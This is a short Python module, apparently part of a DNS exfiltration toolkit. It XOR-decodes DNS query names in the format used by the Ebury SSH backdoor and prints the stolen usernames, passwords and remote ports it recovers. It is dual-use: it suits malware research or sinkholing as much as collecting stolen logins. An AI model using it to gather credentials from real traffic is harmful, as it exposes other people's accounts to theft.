from tdns.exfil import base


class ebury(base):
    def __init__(self, xor_key=0x000d5345, key_size=4, **kwargs):
        super().__init__(**kwargs)
        self.xor_key = xor_key
        self.key_size = key_size

    def decode(self, text):
        split_list = [text[i:i+2*self.key_size]
                      for i in range(0, len(text), 2*self.key_size)]

        def decrypt(hex_str):
            results = []
            length = len(hex_str) >> 1
            unhexed = int(hex_str, base=16)
            xored = unhexed ^ self.xor_key
            for _ in range(length):
                results.append(xored & 0xff)
                xored >>= 8
            results.reverse()
            return results
        return ''.join((chr(c) for hex_str in split_list for c in decrypt(hex_str)))

    def process(self, msg):
        text = msg.question[0].name.to_text().split('.', 1)
        creds = self.decode(text[0])
        cred_type = 'IN' if creds.count(':') == 1 else 'OUT'
        creds = creds.split(':')
        print(
            f"Received credential type {cred_type}. User: {creds[0]} | Password: {creds[1]}", end='')
        if cred_type == 'OUT':
            print(f" | Remote port: {creds[2]}")
        else:
            print()
